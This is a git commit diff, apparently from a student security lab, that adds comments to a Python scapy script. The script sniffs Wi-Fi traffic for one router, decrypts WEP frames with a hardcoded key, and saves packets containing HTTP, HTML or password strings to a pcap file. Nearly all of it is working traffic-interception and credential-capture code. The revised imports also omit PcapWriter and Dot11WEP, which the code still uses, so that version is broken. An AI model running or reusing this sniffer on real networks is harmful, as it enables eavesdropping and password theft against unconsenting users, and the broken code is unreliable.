155487fa10dfe02f5ce176a90b87de4be4b95165
DanTheetje <51004498+DanTheetje@users.noreply.github.com>
2023-12-07 15:02:04 +0100

    Update sniffer.py
    Comments toegevoegd

--- Sniffer/sniffer.py
+++ Sniffer/sniffer.py
@@ -1,19 +1,28 @@
-from scapy.all import *
-import decrypt
+from scapy.all import sniff # import sniff function from the scapy library
+from decrypt import decryptWEP # import decryptWEP function from decrypt.py
 
-pkl = PcapWriter("/home/kali/Desktop/WEPpackets.pcap", append = True, sync = True)
-router_MAC= "74:da:38:eb:6f:dc"
+# Define necessary variables
+package_list = PcapWriter("/home/kali/Desktop/WEPpackets.pcap", append = True, sync = True) # Directory to store filtered packages
+router_MAC= "74:da:38:eb:6f:dc" 
 WEP_key = "ESAT2"
 network_interface = "wlan1" #"wlan0"
 
 def decryptAndFilter(p):
-	if p.haslayer(Dot11WEP):
-		dp = decrypt.decryptWEP(p,WEP_key)
-		if "HTTP"in str(dp) or "HTML" in str(dp).upper() or "PASSWORD" in str(dp).upper(): #geen upper bij http
-			pkl.write(p)
-			print("\n"+10*"-------------------"+"\n")
+
+	# Filter for WEP packages
+	if p.haslayer(Dot11WEP): 
+		dp = decryptWEP(p,WEP_key) # decrypt the WEP package
+
+		# Filter for packets containing "HTTP", "HTML" or "PASSWORD" in their data
+		if "HTTP" in str(dp) or "HTML" in str(dp).upper() or "PASSWORD" in str(dp).upper(): 
+			
+			package_list.write(p) # Store the package to the package list
+			print("\n"+20*"-"+"\n") # Write a line to separate packages visually in the printed output
 			return dp
-		
+# Let the user know the sniffer has started successfully		
 print("Sniffing started...")
+
+# Sniff will gather the packages it sniffs on the network_interface, it automaticaaly filters for packages sent or received by the targetted router
+# it will print the packages that are outputted by decryptAndFilter and it won't store any packages in the device's RAM
 sniff(iface=network_interface, filter="ether src "+router_MAC+" or ether dst "+router_MAC, prn=decryptAndFilter, store=0)
 
